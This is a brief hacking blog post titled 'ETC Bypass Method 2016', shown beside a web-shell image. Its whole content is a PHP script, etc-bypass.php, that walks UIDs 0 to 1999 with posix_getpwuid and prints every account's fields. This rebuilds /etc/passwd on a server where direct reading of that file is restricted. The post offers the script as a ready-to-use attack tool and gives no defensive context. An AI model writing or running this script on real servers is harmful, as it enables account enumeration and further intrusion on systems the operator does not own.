---
layout: post
title: ETC Bypass Method 2016
date: 2023-08-26 22:50
tags: [Hacking]
author: theguler
comments: true
categories: [Hacking - Security]
---
<!-- wp:image {"id":8236,"width":"404px","height":"auto","sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large is-resized"><img src="https://farukguler.com/assets/post_images/web-shell.png?w=1024" alt="" class="wp-image-8236" style="width:504px;height:auto" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><strong>etc-bypass.php</strong></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">&lt;?php for($uid=0;$uid&lt;2000;$uid++){ //cat /etc/passwd $nothing = posix_getpwuid($uid); if (!empty($nothing)) { while (list ($key, $val) = each($nothing)){ print "$val:"; } print "&lt;br /&gt;"; } } ?&gt;</pre>
<!-- /wp:preformatted -->
